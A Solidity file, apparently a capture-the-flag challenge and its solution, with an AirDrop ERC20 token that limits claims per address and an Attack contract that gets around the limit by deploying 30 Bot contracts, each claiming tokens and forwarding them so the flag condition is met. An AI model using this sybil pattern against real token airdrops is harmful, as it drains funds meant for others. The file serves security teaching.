// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ccb5f2d8ca9d194623cf3cff7f010ab92715826b/contracts/token/ERC20/ERC20.sol";

contract AirDrop is ERC20 {
    mapping (address=>uint) logger;
    event SendFlag();

    constructor() ERC20("ZJU SSEC", "ZJU") {}

    function profit() public {
        require(logger[msg.sender] == 0);
        logger[msg.sender] = 1;
        _mint(msg.sender, 20);
    }

    function getFlag() public {
        require(balanceOf(msg.sender) >= 500);
        emit SendFlag();
    }
}

contract Bot {
    function execute(address attack, AirDrop airdrop) public {
        airdrop.profit();
        airdrop.transfer(attack, 20);
    }
}

contract Attack {
    function attack(AirDrop airdrop) public {
        airdrop.profit();
        for (uint i = 0; i < 30; i++) {
            Bot bot = new Bot();
            bot.execute(address(this), airdrop);
        }
        airdrop.getFlag();
    }
}



